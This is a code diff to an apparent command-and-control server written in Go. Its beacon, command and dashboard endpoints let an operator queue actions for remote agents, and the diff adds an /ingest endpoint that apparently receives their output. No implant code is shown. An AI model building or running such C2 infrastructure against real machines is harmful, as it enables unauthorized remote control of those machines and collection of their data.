@@ -28,6 +28,7 @@ func main() {
 			"============================================")
 
 	http.HandleFunc("/beacon", handleBeacon)
+	http.HandleFunc("/ingest", handleIngest)
 	http.HandleFunc("/command", handleSendCommand)
 	http.HandleFunc("/", handleDashboard)
 
@@ -49,8 +50,8 @@ func handleDashboard(w http.ResponseWriter, _ *http.Request) {
 	}
 }
 
-func handleBeacon(w http.ResponseWriter, r *http.Request) {
-	if r.Method != "POST" {
+func handleBeacon(w http.ResponseWriter, request *http.Request) {
+	if request.Method != "POST" {
 		http.Error(w, "POST seulement", 405)
 		return
 	}
@@ -58,7 +59,7 @@ func handleBeacon(w http.ResponseWriter, r *http.Request) {
 	connectionCount++
 
 	var agentInfo shared.AgentInfo
-	err := json.NewDecoder(r.Body).Decode(&agentInfo)
+	err := json.NewDecoder(request.Body).Decode(&agentInfo)
 
 	now := time.Now().Format("15:04:05")
 
@@ -76,7 +77,6 @@ func handleBeacon(w http.ResponseWriter, r *http.Request) {
 		fmt.Printf("    → Envoyé: %s\n", cmd.Action)
 	} else {
 		w.WriteHeader(200)
-		fmt.Printf("bip ")
 		w.Write([]byte("{}"))
 	}
 }
@@ -98,4 +98,19 @@ func handleSendCommand(w http.ResponseWriter, r *http.Request) {
 	fmt.Printf("[!] Commande pour %s: %s\n", cmd.ID, cmd.Action)
 
 	w.Write([]byte(`{"status": "ok"}`))
+}
+
+func handleIngest(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "POST" {
+		http.Error(w, "POST seulement", 405)
+		return
+	}
+
+	var output string
+	if err := json.NewDecoder(r.Body).Decode(&output); err != nil {
+		http.Error(w, err.Error(), 400)
+		return
+	}
+
+	w.Write([]byte(output))
 }
